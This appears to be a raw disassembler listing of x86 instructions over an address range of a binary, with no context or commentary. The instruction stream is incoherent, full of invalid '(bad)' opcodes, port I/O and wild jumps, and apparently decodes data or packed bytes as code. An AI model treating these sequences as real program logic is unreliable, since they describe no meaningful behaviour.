  41a3f5:	fdiv   st(6),st
  41a3f7:	add    dl,ah
  41a3f9:	psrad  mm7,mm3
  41a3fc:	push   cs
  41a3fd:	in     eax,0xde
  41a3ff:	shl    BYTE PTR [eax-0xe3a1442],cl
  41a405:	in     eax,dx
  41a406:	enter  0xcdbb,0xb5
  41a40a:	stc    
  41a40b:	int3   
  41a40c:	aam    0xda
  41a40e:	repnz int3 
  41a410:	clc    
  41a411:	loope  0x41a408
  41a413:	add    bl,bl
  41a415:	push   es
  41a416:	push   es
  41a417:	or     eax,edi
  41a419:	fcomi  st,st(5)
  41a41b:	jecxz  0x41a41e
  41a41d:	in     al,dx
  41a41e:	in     al,dx
  41a41f:	lods   eax,DWORD PTR ds:[esi]
  41a420:	lods   al,BYTE PTR ds:[esi]
  41a421:	in     al,dx
  41a422:	out    dx,eax
  41a423:	retf   
  41a424:	lods   eax,DWORD PTR ds:[esi]
  41a425:	(bad)  
  41a426:	test   esi,0x3d4cbb1
  41a42c:	out    dx,al
  41a42d:	loop   0x41a403
  41a42f:	mov    esp,0xd1f8ece6
  41a434:	fcmovbe st,st(2)
  41a436:	or     DWORD PTR [edx],eax
  41a438:	leave  
  41a439:	cld    
  41a43a:	fadd   st,st(6)
  41a43c:	fst    DWORD PTR [edx]
  41a43e:	mov    edi,0xdccee2e4
  41a443:	lods   al,BYTE PTR ds:[esi]
  41a444:	mov    al,0xd5
  41a446:	jmp    0x41a421
  41a448:	lock idiv DWORD PTR [eax-0x48fd042f]
  41a44f:	int3   
  41a450:	repz (bad) 
  41a453:	(bad)  
  41a454:	(bad)  
  41a456:	add    esi,eax
  41a458:	retf   0xf8d9
  41a45b:	jecxz  0x41a464
  41a45d:	les    ebp,FWORD PTR [ebp-0x48183c24]
  41a463:	cmc    
  41a464:	mov    ah,0xc4
  41a466:	mov    ch,0xd8
  41a468:	mov    edx,0xddbaffee
  41a46d:	jmp    0xe4e3:0xfdfcfcd2
  41a474:	(bad)  
  41a476:	icebp  
  41a477:	stc    
  41a478:	jmp    0xad06:0xbd809c7
  41a47f:	icebp  
  41a480:	enter  0xf4ca,0xcd
  41a484:	mov    bh,0xd0
  41a486:	mov    dh,0xd8
  41a488:	sti    
  41a489:	cmc    
  41a48a:	into   
  41a48b:	rcl    ecx,cl
  41a48d:	ret    
  41a48e:	hlt    
  41a48f:	int    0xbd
  41a491:	rol    DWORD PTR [ebx],1
  41a493:	ret    0x4f1
  41a496:	out    0xd4,eax
  41a498:	(bad)  
  41a49a:	dec    DWORD PTR [edi]
  41a49c:	add    eax,0xecefa7fe
  41a4a1:	not    edx
  41a4a3:	shl    edx,cl
  41a4a5:	mov    ebx,0xcfbaf0fa
  41a4aa:	mov    edx,0xfdf6c3ed
  41a4af:	mov    dh,0xd1
  41a4b1:	in     eax,0xd5
  41a4b3:	aad    0xd1
  41a4b5:	rcl    cl,cl
  41a4b7:	stc    
  41a4b8:	(bad)  
  41a4b9:	into   
  41a4ba:	(bad)  ds:0xc1b2f8dc
  41a4c0:	test   eax,0xf3efcbce
  41a4c5:	in     eax,dx
  41a4c6:	mov    bh,0xe9
  41a4c8:	lock leave 
  41a4ca:	int3   
  41a4cb:	mov    edi,0xcde2d8c8
  41a4d0:	stc    
  41a4d1:	rol    eax,0x4
  41a4d4:	cmc    
  41a4d5:	jmp    0x41a4d6
  41a4d7:	loop   0x41a4bc
  41a4d9:	loope  0x41a4dc
  41a4db:	fiadd  WORD PTR [esi]
  41a4dd:	pop    es
  41a4de:	in     al,dx
  41a4df:	enter  0xe5f0,0xc5
  41a4e3:	loopne 0x41a49a
  41a4e5:	mov    bh,0xc9
  41a4e7:	into   
  41a4e8:	retf   
  41a4e9:	lock enter 0xf803,0x1
  41a4ee:	fcmovnb st,st(2)
  41a4f0:	jecxz  0x41a4d3
  41a4f2:	mov    esp,0xe1df00d2
  41a4f7:	fdiv   st(2),st
  41a4f9:	in     eax,dx
  41a4fa:	add    eax,0xa9edfafc
  41a4ff:	in     eax,0xb7
  41a501:	leave  
  41a502:	loopne 0x41a4e4
  41a504:	in     al,0xf2
  41a506:	mov    cl,0xef
  41a508:	icebp  
  41a509:	fsubr  st,st(5)
  41a50b:	mov    eax,0xf3dbf1de
  41a510:	imul   ch
  41a512:	int3   
  41a513:	mov    edx,0xbf0f600
  41a518:	(bad)  
  41a51a:	in     eax,0xd4
  41a51c:	add    al,0xce
  41a51e:	(bad)  
  41a51f:	lock test eax,0xedeac3f0
  41a525:	out    0xb6,al
  41a527:	mov    eax,0xbdcfc5e5
  41a52c:	hlt    
  41a52d:	mov    al,0xfb
  41a52f:	mov    ebp,0xd9e0d4f7
  41a534:	pop    es
  41a535:	add    bl,bh
  41a537:	(bad)  
  41a539:	clc    
  41a53a:	add    ebp,esi
  41a53c:	fcmove st,st(3)
  41a53e:	jmp    0x41a523
  41a540:	repnz rcl dh,cl
  41a543:	iret   
  41a544:	xlat   BYTE PTR ds:[ebx]
  41a545:	(bad)  
  41a546:	aam    0xf4
  41a548:	into   
  41a549:	fidivr WORD PTR [eax-0xc361d28]
  41a54f:	inc    BYTE PTR [eax]
  41a551:	loop   0x41a518
  41a553:	in     al,dx
  41a554:	rol    BYTE PTR ds:0xf6e6d1,cl
  41a55a:	retf   0xc80e
  41a55d:	or     ch,bh
  41a55f:	int    0xc2
  41a561:	call   0xa9325c2a
  41a566:	out    0xd9,eax
  41a568:	out    0xf3,al
  41a56a:	hlt    
  41a56b:	mov    dh,0xbe
  41a56d:	stc    
  41a56e:	out    dx,eax
  41a56f:	clc    
  41a570:	mov    esi,0xea01dfdb
  41a575:	inc    ch
  41a577:	fild   WORD PTR [ecx]
  41a579:	fadd   DWORD PTR [edx]
  41a57b:	cli    
  41a57c:	loope  0x41a58b
  41a57e:	mov    dl,0xcf
  41a580:	lods   eax,DWORD PTR ds:[esi]
  41a581:	int3   
  41a582:	mov    dh,0xc4
  41a584:	aam    0xc1
  41a586:	loope  0x41a560
  41a588:	div    cl
  41a58a:	mov    esi,0xf6b9eeba
  41a58f:	fmul   st,st(7)
  41a591:	mov    esp,0xc3b9fdc1
  41a596:	or     DWORD PTR [eax],ecx
  41a598:	retf   
  41a599:	stc    
  41a59a:	add    ecx,ebx
  41a59c:	loope  0x41a589
  41a59e:	in     eax,0xe0
  41a5a0:	fsubrp st(7),st
  41a5a2:	enter  0xc3bc,0xe2
  41a5a6:	mov    ch,0xf8
  41a5a8:	fcmovbe st,st(1)
  41a5aa:	cmc    
  41a5ab:	(bad)  
  41a5ad:	add    ch,al
  41a5af:	fdivp  st(5),st
  41a5b1:	aam    0xc0
  41a5b3:	test   DWORD PTR [ecx],0xc1c6eaf8
  41a5b9:	in     al,0xfb
  41a5bb:	or     al,ah
  41a5bd:	in     al,0xa9
  41a5bf:	loop   0x41a574
  41a5c1:	rol    cl,cl
  41a5c3:	div    DWORD PTR [ebx+edx*8-0x34391a05]
  41a5ca:	xlat   BYTE PTR ds:[ebx]
  41a5cb:	into   
  41a5cc:	enter  0xb7b0,0xf4
  41a5d0:	iret   
  41a5d1:	loop   0x41a5aa
  41a5d3:	rol    BYTE PTR [esp+edi*4],cl
  41a5d6:	fxch   st(3)
  41a5d8:	push   es
  41a5d9:	fiadd  WORD PTR [eax+edi*8]
  41a5dc:	(bad)  
  41a5dd:	enter  0xcec1,0xef
  41a5e1:	in     eax,0xac
  41a5e3:	loop   0x41a5cf
  41a5e5:	loopne 0x41a5a2
  41a5e7:	retf   
  41a5e8:	fmulp  st(4),st
  41a5ea:	fprem1 
  41a5ec:	mov    eax,0xf1bcf2e1
  41a5f1:	add    esp,ecx
  41a5f3:	xlat   BYTE PTR ds:[ebx]
  41a5f4:	fcmovnbe st,st(0)
  41a5f6:	aam    0xc0
  41a5f8:	cli    
  41a5f9:	in     eax,dx
  41a5fa:	or     esp,edx
  41a5fc:	sti    
  41a5fd:	clc    
  41a5fe:	lock into 
  41a600:	mov    esp,0xadf0f6ac
  41a605:	enter  0xcddb,0xed
  41a609:	repz mov esi,0xcfedb5ce
  41a60f:	ror    esp,cl
  41a611:	int3   
  41a612:	add    al,bl
  41a614:	in     al,0xf6
  41a616:	not    ah
  41a618:	add    bl,bh
  41a61a:	in     al,dx
  41a61b:	out    dx,eax
  41a61c:	cld    
  41a61d:	jecxz  0x41a5db
  41a61f:	(bad)  
  41a621:	(bad)
  41a624:	cmc    
  41a625:	fprem  
  41a627:	(bad)
  41a62a:	std    
  41a62b:	std    
  41a62c:	aam    0xf6
  41a62e:	jecxz  0x41a61d
  41a630:	jecxz  0x41a60c
  41a632:	fadd   QWORD PTR [esi]
  41a634:	jecxz  0x41a634
  41a636:	hlt    
  41a637:	hlt    
  41a638:	jmp    0x41a602
  41a63a:	jmp    0xeb437f3c
  41a63f:	icebp  
  41a640:	test   eax,0xc3f3b5e0
  41a645:	lock repnz loopne 0x41a619
  41a649:	iret   
  41a64a:	call   0xd724584c
  41a64f:	mov    esp,0xe1c5fada
  41a654:	add    al,0xd5
  41a656:	in     eax,0xf6
  41a658:	retf   
  41a659:	fcomip st,st(4)
  41a65b:	repz call 0xb002555a
  41a661:	out    0xbc,al
  41a663:	rcl    edi,1
  41a665:	icebp  
  41a666:	(bad)  
  41a667:	jmp    0xd3219a5f
  41a66c:	xlat   BYTE PTR ds:[ebx]
  41a66d:	aad    0xfb
  41a66f:	mov    edx,0xf7f5fbf7
  41a674:	xlat   BYTE PTR ds:[ebx]
  41a675:	add    ebp,ebx
  41a677:	sti    
  41a678:	cld    
  41a679:	or     ecx,eax
  41a67b:	add    edi,edx
  41a67d:	loopne 0x41a650
  41a67f:	retf   0xb0c0
  41a682:	shl    bl,0xf5
  41a685:	in     eax,dx
  41a686:	out    dx,al
  41a687:	imul   ebx
  41a689:	shl    eax,1
  41a68b:	call   0xd8439865
  41a690:	frstpm(287 only) 
  41a692:	mov    DWORD PTR [edi],0xfff7e5ea
  41a698:	(bad)  
  41a699:	clc    
  41a69a:	in     eax,dx
  41a69b:	leave  
  41a69c:	or     edx,DWORD PTR [ebx]
  41a69e:	mov    esi,0xcee1c2e7
  41a6a3:	lock mov dh,0xa8
  41a6a6:	(bad)  
  41a6a7:	cli    
  41a6a8:	mov    eax,0xbdb4f7f6
  41a6ad:	enter  0xf8ee,0xcd
  41a6b1:	add    eax,0xf5fee6f5
  41a6b6:	or     eax,ebp
  41a6b8:	cld    
  41a6b9:	jecxz  0x41a6bd
  41a6bb:	std    
  41a6bc:	add    edx,DWORD PTR [edx]
  41a6be:	ret    0xb7af
  41a6c1:	ror    bl,cl
  41a6c3:	jecxz  0x41a6ae
  41a6c5:	out    dx,eax
  41a6c6:	fdivr  st,st(0)
  41a6c8:	mov    ah,0xf9
  41a6ca:	rcl    al,1
  41a6cc:	(bad)  
  41a6ce:	dec    bh
  41a6d0:	(bad)  
  41a6d2:	clc    
  41a6d3:	add    edi,ecx
  41a6d5:	or     ebx,ebp
  41a6d7:	cmc    
  41a6d8:	(bad)
  41a6db:	add    al,0xa
  41a6dd:	iret   
  41a6de:	lods   eax,DWORD PTR ds:[esi]
  41a6df:	lock scas eax,DWORD PTR es:[edi]
  41a6e1:	repz mov dh,0xd6
  41a6e4:	test   eax,0xf9c9afc8
  41a6e9:	lds    esi,FWORD PTR [ebp-0x400a3204]
  41a6ef:	(bad)  
  41a6f1:	(bad)  
  41a6f2:	fadd   DWORD PTR [esp+edi*8]
  41a6f5:	retf   
  41a6f6:	sar    cl,0xde
  41a6f9:	fiadd  WORD PTR [eax]
  41a6fb:	retf   
  41a6fc:	leave  
  41a6fd:	retf   
  41a6fe:	icebp  
  41a6ff:	shl    ah,cl
  41a701:	(bad)  
  41a702:	in     al,dx
  41a703:	out    0xdb,eax
  41a705:	in     eax,dx
  41a706:	int3   
  41a707:	mov    eax,0xf4ffcae5
  41a70c:	iret   
  41a70d:	in     al,dx
  41a70e:	mov    ebp,0xf7020207
  41a713:	add    al,0xe6
  41a715:	or     ecx,DWORD PTR [ecx]
  41a717:	in     al,0xf9
  41a719:	add    edi,edi
  41a71b:	fstp   st(1)
  41a71d:	out    0xd2,al
  41a71f:	shl    cl,0xcc
  41a722:	scas   al,BYTE PTR es:[edi]
  41a723:	ret    0xd0ee
  41a726:	(bad)  
  41a728:	leave  
  41a729:	icebp  
  41a72a:	test   al,0xdb
  41a72d:	add    bl,ch
  41a72f:	mov    ebp,0xecedfffe
  41a734:	(bad)  
  41a735:	(bad)  
  41a736:	lock aad 0xc4
  41a739:	cld    
  41a73a:	add    eax,0xd8e8edf3
  41a73f:	mov    esi,0xf0ebd6d6
  41a744:	loop   0x41a6fa
  41a746:	icebp  
  41a747:	xlat   BYTE PTR ds:[ebx]
  41a748:	stc    
  41a749:	sti    
  41a74a:	fidivr WORD PTR [ebp-0x3d2f0efd]
  41a750:	out    dx,al
  41a751:	repz pop es
  41a753:	jmp    0x41a74c
  41a755:	(bad)  
  41a757:	retf   0xae6
  41a75a:	ret    
  41a75b:	fmul   st(3),st
  41a75d:	add    ah,ah
  41a75f:	out    dx,eax
  41a760:	jecxz  0x41a70e
  41a762:	rol    edi,cl
  41a764:	mov    dh,0xe4
  41a766:	scas   eax,DWORD PTR es:[edi]
  41a767:	iret   
  41a768:	into   
  41a769:	in     al,dx
  41a76a:	shl    DWORD PTR [edx+ebp*8-0xd272222],1
  41a771:	cmc    
  41a772:	loop   0x41a764
  41a774:	fdivr  DWORD PTR [ebp+eiz*8-0x17381600]
  41a77b:	push   es
  41a77c:	out    0xea,al
  41a77e:	loopne 0x41a751
  41a780:	lock lock aad 0xcc
  41a784:	test   dh,0xea
  41a787:	fcmovnbe st,st(4)
  41a789:	fldpi  
  41a78b:	imul   al
  41a78d:	call   0xc839af80
  41a792:	out    0xd4,al
  41a794:	add    al,0xc3
  41a796:	add    edi,edi
  41a798:	or     esi,edi
  41a79a:	into   
  41a79b:	add    al,0xc
  41a79d:	or     al,0xe6
  41a79f:	call   0xeb137954
  41a7a4:	in     al,dx
  41a7a5:	loopne 0x41a778
  41a7a7:	scas   al,BYTE PTR es:[edi]
  41a7a8:	repnz aad 0xd4
  41a7ab:	jmp    edx
  41a7ad:	fmulp  st(6),st
  41a7af:	ret    0x6f5
  41a7b2:	cld    
  41a7b3:	mov    edx,0xdad7e6
  41a7b8:	leave  
  41a7b9:	or     esp,edx
  41a7bb:	(bad)  
  41a7bc:	in     al,dx
  41a7bd:	adc    edi,DWORD PTR [eax-0x1c0e3844]
  41a7c3:	in     al,dx
  41a7c4:	out    0xb6,al
  41a7c6:	jmp    0xcdcf:0xd4e4c8d3
  41a7cd:	mov    ecx,0xfff4d5b9
  41a7d2:	add    al,0xd2
  41a7d4:	repz (bad) 
  41a7d7:	xlat   BYTE PTR ds:[ebx]
  41a7d8:	(bad)  
  41a7d9:	fdivr  st(5),st
  41a7db:	(bad)  
  41a7dc:	in     eax,dx
  41a7dd:	std    
  41a7de:	int3   
  41a7df:	call   0xb7f45ac2
  41a7e4:	repnz ror dh,0xca
  41a7e8:	aam    0xf4
  41a7ea:	(bad)  
  41a7eb:	mov    dh,0xbe
  41a7ed:	out    dx,eax
  41a7ee:	enter  0xd0d9,0x6
  41a7f2:	add    ecx,DWORD PTR [ebx]
  41a7f4:	or     cl,BYTE PTR [edx]
  41a7f6:	out    0xf5,al
  41a7f8:	call   0xdd4d72c3
  41a7fd:	or     bh,BYTE PTR [ebp-0x290a081f]
  41a803:	out    dx,al
  41a804:	jmp    0xc91b57f8
  41a809:	enter  0xf4ee,0xf3
  41a80d:	shl    eax,cl
  41a80f:	ret    0xecc0
  41a812:	repz (bad) 
  41a814:	clc    
  41a815:	out    0xe6,al
  41a817:	add    BYTE PTR [ebx],al
  41a819:	in     al,0xc5
  41a81b:	psllq  mm0,QWORD PTR [esi]
  41a81e:	in     al,dx
  41a81f:	loopne 0x41a80e
  41a821:	jmp    0xb5246a11
  41a826:	in     al,dx
  41a827:	jmp    0x41a7f2
  41a829:	fcmove st,st(4)
  41a82b:	xlat   BYTE PTR ds:[ebx]
  41a82c:	leave  
  41a82d:	add    esi,edx
  41a82f:	mov    dh,0xd5
  41a831:	cld    
  41a832:	cld    
  41a833:	rol    ah,0xf7
  41a836:	loopne 0x41a82c
  41a838:	iret   
  41a839:	std    
  41a83a:	loop   0x41a848
  41a83c:	or     edx,ebx
  41a83e:	loop   0x41a829
  41a840:	retf   
  41a841:	mov    ebp,0xb1c1cef4
  41a846:	(bad)  
  41a848:	repz mov eax,0xb9dbd7b7
  41a84e:	shl    ebp,1
  41a850:	add    ecx,edx
  41a852:	int3   
  41a853:	imul   bl
  41a855:	fld    st(5)
  41a857:	pop    es
  41a858:	out    0xcb,al
  41a85a:	add    esp,esi
  41a85c:	adc    ebp,ecx
  41a85e:	(bad)  
  41a85f:	rol    dl,1
  41a861:	div    ch
  41a863:	loop   0x41a839
  41a865:	(bad)  
  41a866:	into   
  41a867:	fcomip st,st(3)
  41a869:	iret   
  41a86a:	in     al,0xec
  41a86c:	ror    al,1
  41a86e:	inc    BYTE PTR [ecx]
  41a870:	hlt    
  41a871:	repnz (bad) 
  41a873:	loope  0x41a868
  41a875:	or     al,BYTE PTR [edx]
  41a877:	enter  0xfcdd,0xc5
  41a87b:	repz fucomip st,st(2)
  41a87e:	loop   0x41a82d
  41a880:	div    BYTE PTR [edi-0xd4e3a49]
  41a886:	mov    dl,0xef
  41a888:	(bad)  
  41a889:	(bad)  
  41a88a:	mov    ebx,0xfcfdd0b5
  41a88f:	fadd   st(7),st
  41a891:	ret    
  41a892:	add    DWORD PTR [esi],eax
  41a894:	fiadd  DWORD PTR [eax]
  41a896:	or     eax,DWORD PTR [edx]
  41a898:	retf   0xf5e1
  41a89b:	out    0xc1,eax
  41a89d:	fmul   st,st(2)
  41a89f:	shl    cl,1
  41a8a1:	int    0xd3
  41a8a3:	shr    al,0xed
  41a8a6:	in     al,0xdf
  41a8a8:	cli    
  41a8a9:	mov    esi,0xfa03b5b5
  41a8ae:	add    dh,bl
  41a8b0:	out    0xe2,eax
  41a8b2:	lock (bad) 
  41a8b5:	shl    edi,1
  41a8b7:	jmp    0x41a8a2
  41a8b9:	enter  0xe3c7,0x4
  41a8bd:	adc    edi,DWORD PTR [ebp-0x11361023]
  41a8c3:	out    dx,eax
  41a8c4:	lds    esi,FWORD PTR [ebp-0x482c0e3f]
  41a8ca:	repz cmc 
  41a8cc:	(bad)  
  41a8ce:	loop   0x41a8aa
  41a8d0:	in     eax,dx
  41a8d1:	fidivr DWORD PTR [edi-0x21f42c0d]
  41a8d7:	ret    0xf08
  41a8da:	into   
  41a8db:	or     DWORD PTR ds:0xbeb1e305,eax
  41a8e1:	mov    cl,0xc1
  41a8e3:	int3   
  41a8e4:	jmp    0xb20a78cb
  41a8e9:	stc    
  41a8ea:	fidiv  DWORD PTR [ebp-0x2e2b300d]
  41a8f0:	lock in eax,0x7
  41a8f3:	ret    0xc705
  41a8f6:	cmc    
  41a8f7:	fcomp  st(4)
  41a8f9:	out    0xe2,al
  41a8fb:	out    dx,al
  41a8fc:	fiadd  DWORD PTR [ebx]
  41a8fe:	fdivr  QWORD PTR [ebp-0x93e301d]
  41a904:	mov    ebx,0xf9e9d8f3
  41a909:	into   
  41a90a:	(bad)  
  41a90c:	(bad)  
  41a90d:	fcmovu st,st(5)
  41a90f:	(bad)  
  41a911:	in     eax,0xc2
  41a913:	int3   
  41a914:	rcl    eax,0xc0
  41a917:	jmp    0x41a911
  41a919:	fcomp  st(0)
  41a91b:	repz or esi,ebx
  41a91e:	out    0xdf,eax
  41a920:	ffree  st(3)
  41a922:	in     eax,0xdb
  41a924:	(bad)  
  41a925:	int    0xf6
  41a927:	(bad)  
  41a928:	(bad)  
  41a929:	(bad)  
  41a92a:	mov    edi,0xd2c2fcef
  41a92f:	sar    dh,1
  41a931:	std    
  41a932:	loopne 0x41a92f
  41a934:	xlat   BYTE PTR ds:[ebx]
  41a935:	add    eax,0x1fcf9bf
  41a93a:	or     esi,ebx
  41a93c:	retf   0xdccd
  41a93f:	test   eax,0xb0d6aeee
  41a944:	lock (bad) 
  41a946:	fcmove st,st(2)
  41a948:	sti    
  41a949:	repz (bad) 
  41a94c:	retf   0xf3fd
  41a94f:	(bad)  
  41a951:	stc    
  41a952:	(bad)  
  41a953:	loope  0x41a930
  41a955:	retf   0xd8d5
  41a958:	cld    
  41a959:	out    0xe9,eax
  41a95b:	repz jmp 0xd6c4:0xcae7f00c
  41a963:	neg    ebx
  41a965:	int    0xf7
  41a967:	(bad)  
  41a968:	xlat   BYTE PTR ds:[ebx]
  41a969:	into   
  41a96a:	cld    
  41a96b:	into   
  41a96c:	lock mov esi,0xded3d0cd
  41a972:	add    DWORD PTR [edx-0x61c062d],edi
  41a978:	(bad)  
  41a979:	fmul   DWORD PTR [ebx+ecx*1]
  41a97c:	lds    edx,FWORD PTR [ebx]
  41a97e:	rcl    ebx,cl
  41a980:	xlat   BYTE PTR ds:[ebx]
  41a981:	(bad)  
  41a983:	mov    esp,0xfac5c4b2
  41a988:	hlt    
  41a989:	int    0xbf
  41a98b:	jecxz  0x41a957
  41a98d:	retf   0xd5d5
  41a990:	fsubr  st(6),st
  41a992:	hlt    
  41a993:	les    eax,FWORD PTR [esi]
  41a995:	hlt    
  41a996:	jmp    0xef22ab5b
  41a99b:	frndint 
  41a99d:	in     eax,0xe9
  41a99f:	in     eax,dx
  41a9a0:	fucom  st(4)
  41a9a2:	shl    bl,cl
  41a9a4:	(bad)  
  41a9a5:	retf   
  41a9a6:	out    0xc0,al
  41a9a8:	(bad)  
  41a9a9:	out    dx,eax
  41a9aa:	jmp    0xf2c2:0xf8ceecc8
  41a9b1:	repz add DWORD PTR [ebx],ecx
  41a9b4:	clc    
  41a9b5:	add    ch,cl
  41a9b7:	xlat   BYTE PTR ds:[ebx]
  41a9b8:	in     al,0xfc
  41a9ba:	fdiv   st(3),st
  41a9bc:	or     ah,bh
  41a9be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9bf:	in     eax,dx
  41a9c0:	mov    ebp,0xefb2b2c2
  41a9c5:	mov    ebx,0xf2c7d2c8
  41a9ca:	(bad)  
  41a9cc:	loop   0x41a9c9
  41a9ce:	clc    
  41a9cf:	loop   0x41a9c7
  41a9d1:	ret    0xf1c2
  41a9d4:	icebp  
  41a9d5:	xlat   BYTE PTR ds:[ebx]
  41a9d6:	aam    0xe4
  41a9d8:	fcmovne st,st(6)
  41a9da:	in     eax,0xe5
  41a9dc:	int3   
  41a9dd:	loopne 0x41a9a8
  41a9df:	mov    esi,0xc1c6e2ed
  41a9e4:	shl    BYTE PTR [eax-0x2281405],0xdb
  41a9eb:	retf   
  41a9ec:	aam    0xed
  41a9ee:	ret    
  41a9ef:	int3   
  41a9f0:	stc    
  41a9f1:	int    0x7
  41a9f3:	(bad)  
  41a9f4:	add    eax,DWORD PTR [ebx]
  41a9f6:	jecxz  0x41a9ee
  41a9f8:	loop   0x41aa01
  41a9fa:	cmc    
  41a9fb:	add    cl,al
  41a9fd:	ffree  st(4)
  41a9ff:	(bad)  
  41aa01:	rol    cl,cl
  41aa03:	stos   BYTE PTR es:[edi],al
  41aa04:	repnz (bad) 
  41aa06:	repnz xlat BYTE PTR ds:[ebx]
  41aa08:	cmc    
  41aa09:	mov    dh,0xb6
  41aa0b:	shl    DWORD PTR [ebp-0x420e1214],1
  41aa11:	fadd   QWORD PTR [eax]
  41aa13:	(bad)  
  41aa15:	lock shr bh,0xdf
  41aa19:	in     eax,0xea
  41aa1b:	clc    
  41aa1c:	fiadd  DWORD PTR [eax]
  41aa1e:	into   
  41aa1f:	in     eax,0xd0
  41aa21:	out    dx,eax
  41aa22:	enter  0xebe1,0xd7
  41aa26:	(bad)  
  41aa27:	mov    ebx,0xf7cce8bb
  41aa2c:	ret    
  41aa2d:	neg    esp
  41aa2f:	clc    
  41aa30:	rol    DWORD PTR [edi],cl
  41aa32:	push   es
  41aa33:	std    
  41aa34:	jmp    0xe9df:0xefe6c6e3
  41aa3b:	jmp    0xaa1ab40a
  41aa40:	call   0xcff2a22e
  41aa45:	jmp    0xbacb:0xefefdfee
  41aa4c:	mov    ch,0xc3
  41aa4e:	int    0xf6
  41aa50:	aad    0x2
  41aa52:	repnz loopne 0x41aa35
  41aa55:	stc    
  41aa56:	fadd   st,st(2)
  41aa58:	out    0x9,eax
  41aa5a:	out    dx,eax
  41aa5b:	fisttp QWORD PTR [ecx]
  41aa5d:	or     eax,0xc7f6e1ad
  41aa62:	mov    ebp,0xe6e0bbeb
  41aa67:	mov    ch,0xd0
  41aa69:	leave  
  41aa6a:	div    BYTE PTR [ebp-0x45032817]
  41aa70:	out    0xf5,al
  41aa72:	fadd   DWORD PTR [ecx]
  41aa74:	std    
  41aa75:	ret    0x103
  41aa78:	ud2    
  41aa7a:	jmp    esp
  41aa7c:	in     eax,0x11
  41aa7e:	repnz shl esi,1
  41aa81:	loop   0x41aa58
  41aa83:	out    dx,al
  41aa84:	retf   
  41aa85:	mov    bh,0xf3
  41aa87:	into   
  41aa88:	sti    
  41aa89:	out    dx,eax
  41aa8a:	mov    ah,0xfe
  41aa8c:	add    eax,DWORD PTR [ebx]
  41aa8e:	iret   
  41aa8f:	ret    
  41aa90:	(bad)  
  41aa91:	ffree  st(6)
  41aa93:	(bad)  
  41aa95:	ret    0xe2cb
  41aa98:	(bad)  
  41aa9a:	hlt    
  41aa9b:	adc    ecx,esp
  41aa9d:	cli    
  41aa9e:	ret    0xc5f2
  41aaa1:	aad    0xd5
  41aaa3:	mov    esp,0xcdc0d9c3
  41aaa8:	lods   eax,DWORD PTR ds:[esi]
  41aaa9:	cmc    
  41aaaa:	in     eax,dx
  41aaab:	aam    0xd7
  41aaad:	rol    DWORD PTR [eax],cl
  41aaaf:	ret    
  41aab0:	sti    
  41aab1:	(bad)  
  41aab3:	mov    edi,0xdfff08cb
  41aab9:	clc    
  41aaba:	retf   
  41aabb:	(bad)
  41aabe:	stos   DWORD PTR es:[edi],eax
  41aabf:	into   
  41aac0:	int    0xaf
  41aac2:	rol    bh,cl
  41aac4:	ret    
  41aac5:	(bad)  
  41aac6:	mov    dh,0xf9
  41aac8:	mov    edx,0xb1d1deeb
  41aacd:	mov    ebp,0xfcded7ee
  41aad2:	pop    es
  41aad3:	add    dl,ah
  41aad5:	in     eax,0xe4
  41aad7:	add    ebx,edi
  41aad9:	(bad)
  41aadc:	out    dx,al
  41aadd:	jmp    0x41aac8
  41aadf:	(bad)  
  41aae0:	enter  0xcbe9,0xb4
  41aae4:	xlat   BYTE PTR ds:[ebx]
  41aae5:	icebp  
  41aae6:	sar    ebx,cl
  41aae8:	jmp    0xf4118fc7
  41aaed:	in     eax,dx
  41aaee:	enter  0xbce3,0xc3
  41aaf2:	std    
  41aaf3:	ret    
  41aaf4:	mov    ecx,0xfbfcfae0
  41aaf9:	sti    
  41aafa:	add    eax,0xc7ca01f8
  41aaff:	loope  0x41aad2
  41ab01:	loopne 0x41aaea
  41ab03:	mov    cl,0xcc
  41ab05:	not    dh
  41ab07:	aam    0xb1
  41ab09:	(bad)  
  41ab0a:	cld    
  41ab0b:	repnz mov ah,0xcd
  41ab0e:	leave  
  41ab0f:	fcom   st(2)
  41ab11:	out    dx,al
  41ab12:	icebp  
  41ab13:	fadd   st,st(3)
  41ab15:	rol    esi,0x5
  41ab18:	add    edx,ecx
  41ab1a:	add    al,0x8
  41ab1c:	or     al,0xf
  41ab1e:	out    dx,al
  41ab1f:	fidiv  WORD PTR [ebx-0x534c4a58]
  41ab25:	into   
  41ab26:	in     al,dx
  41ab27:	aam    0xf6
  41ab29:	out    0xb3,al
  41ab2b:	rcl    al,cl
  41ab2d:	fadd   st(3),st
  41ab2f:	mov    dh,0xce
  41ab31:	aad    0xe4
  41ab33:	xlat   BYTE PTR ds:[ebx]
  41ab34:	loope  0x41ab21
  41ab36:	(bad)  
  41ab39:	in     eax,0xff
  41ab3b:	fucomi st,st(3)
  41ab3d:	add    al,0xe2
  41ab3f:	(bad)  
  41ab40:	(bad)  
  41ab41:	mul    dl
  41ab43:	mov    cl,0xe8
  41ab45:	out    dx,al
  41ab46:	leave  
  41ab47:	out    dx,al
  41ab48:	mov    ah,0xf2
  41ab4a:	fnop   
  41ab4c:	aam    0xb0
  41ab4e:	(bad)  
  41ab4f:	mov    eax,0xc7f5c2d0
  41ab54:	push   es
  41ab55:	icebp  
  41ab56:	in     eax,0xea
  41ab58:	cld    
  41ab59:	add    ch,ah
  41ab5b:	call   0xe1ff9e5f
  41ab60:	jmp    0xbbb2:0xe2e4abcb
  41ab67:	sti    
  41ab68:	(bad)  
  41ab69:	cli    
  41ab6a:	dec    al
  41ab6c:	ret    
  41ab6d:	stc    
  41ab6e:	mov    eax,0xe5faefcf
  41ab73:	add    eax,ebp
  41ab75:	fmul   QWORD PTR [ecx]
  41ab77:	add    al,0xc9
  41ab79:	clc    
  41ab7a:	push   cs
  41ab7b:	frstpm(287 only) 
  41ab7d:	sar    BYTE PTR [ecx-0x1e1c5634],0xb1
  41ab84:	call   0xd128793a
  41ab89:	in     eax,0xf0
  41ab8b:	rcl    ah,cl
  41ab8d:	int    0xf9
  41ab8f:	mov    ebp,0xd3bec0fb
  41ab94:	(bad)  
  41ab95:	sti    
  41ab96:	add    edx,eax
  41ab98:	clc    
  41ab99:	push   es
  41ab9a:	in     eax,dx
  41ab9b:	fld    DWORD PTR [ebx]
  41ab9d:	add    edx,ecx
  41ab9f:	mov    esp,0xc2ccc5ad
  41aba4:	(bad)  
  41aba5:	int3   
  41aba6:	loopne 0x41ab79
  41aba8:	rcl    ch,1
  41abaa:	in     eax,dx
  41abab:	mov    dh,0xfe
  41abad:	mov    esp,0xe2d1c2ff
